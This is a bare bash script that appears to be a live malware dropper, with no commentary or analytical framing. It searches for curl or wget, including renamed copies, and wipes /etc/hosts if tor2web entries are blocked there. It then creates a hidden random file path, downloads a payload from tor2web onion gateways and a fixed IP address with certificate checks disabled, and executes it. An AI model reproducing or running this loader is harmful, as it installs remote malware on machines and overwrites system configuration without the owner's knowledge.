#!/bin/bash                 
vodlticezzFA

tbin=$(command -v passwd)
 bpath=$(dirname "${tbin}")
 curl="curl"
 if [ $(curl --version 2>/dev/null|grep "curl "|wc -l) -eq 0 ]
 then curl="echo"
 if [ "${bpath}" != "" ]
 then for f in ${bpath}*
 do strings $f 2>/dev/null|grep -q "CURLOPT_VERBOSE" && curl="$f" && break
 done
 fi
 fi
 wget="wget"
 if [ $(wget --version 2>/dev/null|grep "wgetrc "|wc -l) -eq 0 ]
 then wget="echo"
 if [ "${bpath}" != "" ]
 then for f in ${bpath}*
 do strings $f 2>/dev/null|grep -q "to <bug-wget@gnu.org>" && wget="$f" && break
 done
 fi
 fi
 if [ $(cat /etc/hosts|grep -i "tor2web."|wc -l) -ne 0 ]
 then echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1
 fi
  rand=$(head /dev/urandom|tr -dc A-Za-z0-9|head -c $(shuf -i 4-16 -n 1)
 echo "")
 if [ -z ${rand} ]
 then rand=".tmp"
 fi
 echo "${rand}" > "$(pwd)/.${rand}" 2>/dev/null && LPATH="$(pwd)/.${rand}"
 rm -f "$(pwd)/.${rand}" >/dev/null 2>&1
 echo "${rand}" > "/tmp/.${rand}" 2>/dev/null && LPATH="/tmp/.${rand}"
 rm -f "/tmp/.${rand}" >/dev/null 2>&1
  (${curl} -fsSLk --max-time 75 https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm1 -o ${LPATH}||${curl} -fsSLk --max-time 75 https://an7kmd2wp4xo7hpr.tor2web.io/src/ldm1 -o ${LPATH}||${curl} -fsSLk --max-time 75 https://185.10.68.193/src/ldm1ip -o ${LPATH}||wget --quiet --no-check-certificate --timeout=75 https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm1 -O ${LPATH}||wget --quiet --no-check-certificate --timeout=75 https://an7kmd2wp4xo7hpr.tor2web.io/src/ldm1 -O ${LPATH}||wget --quiet --no-check-certificate --timeout=75 https://185.10.68.193/src/ldm1ip -O ${LPATH}) && chmod +x ${LPATH} && sh ${LPATH}

